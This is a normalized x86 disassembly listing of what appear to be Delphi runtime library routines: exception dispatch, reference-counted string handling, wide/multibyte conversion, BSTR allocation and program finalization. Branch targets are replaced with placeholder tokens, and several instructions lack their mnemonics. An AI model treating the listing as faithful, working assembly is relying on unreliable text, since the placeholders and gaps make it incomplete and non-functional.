cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402b10
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_4038f0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_4035d8
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403928
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403ee0
sub_403950
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405e88
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403174
call sub_403538
sub_4039a4
call sub_405e88
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403174
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_403600
jmp edx
sub_4039ec
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027f8
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403b4c
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403b74
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403bba
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403bd4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403c1a
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403c74
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405c1c
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c98
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405c1c
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403cc0
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403ce4
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403d40
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403d70
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_401264
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_40122c
push eax
call sub_40124c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_40122c
push eax
call sub_40124c
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403dfc
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403ce4
call sub_403d70
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403b74
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403b4c
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_4056e8
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403d40
push eax
call sub_40127c
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403eec
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_402714
pop eax
sub_403f10
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402714
sub_403f40
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_403fb0
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028f0
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402714
sub_403f84
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402714
sub_403fb0
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026f4
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_403fdc
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_403fb0
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403eec
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028f0
sub_40400c
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_40402c
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_404048
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403eec
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_404538
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_40400c
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_40400c
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404538
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_403fdc
jmp r-xdata
sub_4040e4
xor ecx ecx
test edx edx
je r-xdata
jmp sub_403fdc
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_404114
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404048
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_40415c
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_403fdc
not ecx
sub_404188
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028f0
pop ebx
retn
mov ecx ebx
sub_4041b4
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403f40
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_404538
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_404538
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028f0
pop edi
pop esi
pop ebx
retn
sub_4041f8
test edx edx
je r-xdata
mov edx ecx
jmp sub_403f40
test ecx ecx
je sub_403f40
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_4041b4
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_403fb0
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028f0
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028f0
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403f40
pop edx
pop eax
jmp sub_4041b4
call sub_403f40
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_40426c
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_403fb0
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_404538
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028f0
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403f40
dec [ edx - 0x8 ]
sub_4042f8
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_4043b8
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_403fb0
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028f0
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_402714
sub_40440c
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403eec
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_403fdc
jmp r-xdata
pop ebx
retn 0x4
sub_40444c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_4043b8#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028f0
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_404538
mov edi ecx
sub_404494
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_404538
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028f0
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028f0
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_4044f0
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_404538
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403eec
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_403fb0
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_402734
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028f0
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_4045e4
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404608
test edx edx
je sub_4045cc
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_4045cc
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402850
retn
sub_40462c
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_4045cc
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_404814
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_40402c
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_40402c
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404814
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_4046b8
jmp r-xdata
sub_4046b8
test ecx ecx
je sub_4045cc
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402850
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_4046dc
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4046b8
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404744
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_4047c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_404738
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_4046b8
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_404814
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_4045bc
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4045a4
mov ebx eax
mov eax [ edi ]
call sub_404738
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028f0
mov eax esi
sub_404858
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404888
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404888
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404888
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404858
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402850
sub_40491c
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404968
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404968
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403f10
jmp r-xdata
call sub_403eec
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_4045e4
jmp r-xdata
call sub_4045cc
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404950
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404968
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_40491c
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_405758
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_4050ac
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402850
sub_404a78
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028f0
mov edx [ eax + esi ]
add eax ebx
call sub_403f40
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404608
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404a60
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
